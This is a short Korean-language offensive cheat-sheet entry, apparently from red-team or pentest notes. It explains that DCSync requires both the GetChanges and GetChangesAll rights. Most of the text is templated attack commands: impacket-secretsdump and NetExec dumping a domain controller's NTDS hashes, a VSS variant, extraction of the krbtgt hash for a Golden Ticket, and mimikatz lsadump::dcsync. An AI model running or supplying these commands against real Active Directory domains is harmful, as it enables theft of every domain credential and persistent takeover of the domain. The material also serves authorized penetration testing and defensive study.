# 11_GetChanges+GetChangesAll

두 권한이 모두 있어야 DCSync가 가능하다. 하나만 있으면 동작하지 않는다. BloodHound에서 둘 중 하나만 표시되면 실제로 DCSync 불가 상태다.

```bash
impacket-secretsdump <도메인>/<공격자계정>:'<패스워드>'@<DC_IP>  # ← 수정
nxc smb <DC_IP> -u <공격자계정> -p '<패스워드>' --ntds

# VSS 방식 (DRSUAPI 차단 환경)
nxc smb <DC_IP> -u <공격자계정> -p '<패스워드>' --ntds vss

# krbtgt만 추출 (Golden Ticket용)
impacket-secretsdump <도메인>/<공격자계정>:'<패스워드>'@<DC_IP> \
  -just-dc-user krbtgt
```

```bash
# Windows (mimikatz)
lsadump::dcsync /domain:<도메인> /user:krbtgt
lsadump::dcsync /domain:<도메인> /all /csv
```